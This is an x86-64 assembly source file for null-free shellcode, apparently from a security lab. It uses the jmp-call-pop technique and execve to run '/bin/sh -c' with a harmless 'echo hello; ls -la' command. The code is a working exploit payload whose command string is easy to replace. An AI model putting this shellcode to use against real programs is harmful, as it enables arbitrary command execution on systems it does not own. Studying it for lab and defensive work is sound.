section .text
  global _start
    _start:
	BITS 64
	jmp short two
one:
 	pop rbx   ; rbx stores addr of str "/bin/sh"        

 	mov [rbx+30],  rbx  ; copy addr of "/bin/sh" to argv[0]

    lea rax, [rbx+8]    ; the addr of str "-c"
    mov [rbx+38], rax   ; copy addr of "-c" to argv[1]

    lea rax, [rbx+11]   ; the addr of str "echo hello; ls -la"
    mov [rbx+46], rax   ; copy addr of "echo ..." to argv[2]

	xor rax, rax       ; rax = 0
 	mov [rbx+54], rax  ; copy a null pointer to end the argv array, argv[3] = 0
    
    mov rdi, rbx       ; rdi needs to know the addr of command str

 	lea rsi, [rbx+30]  ; rsi needs to know the argv[0]'s addr    
    
    xor rdx, rdx   ; rdx = 0, environ variable array set to null
    
    xor al, al
    mov [rbx+7], al  ; to make 0xff marker at the end of command str to be 0
    mov [rbx+10], al;
    mov [rbx+29], al;

 	mov rax, 59        ; rax = 59
 	syscall

two:
    call one                                                                   
    db '/bin/sh', 0xff ; The command string (terminated by a zero)
    db '-c', 0xff ; The command string (terminated by a zero)
    db 'echo hello; ls -la', 0xff ; The command string (terminated by a zero)
    db 'AAAAAAAA'      ; Place holder for argv[0] 
    db 'BBBBBBBB'      ; Place holder for argv[1]
    db 'CCCCCCCC'      ; Place holder for argv[2]
    db 'DDDDDDDD'      ; Place holder for argv[3]
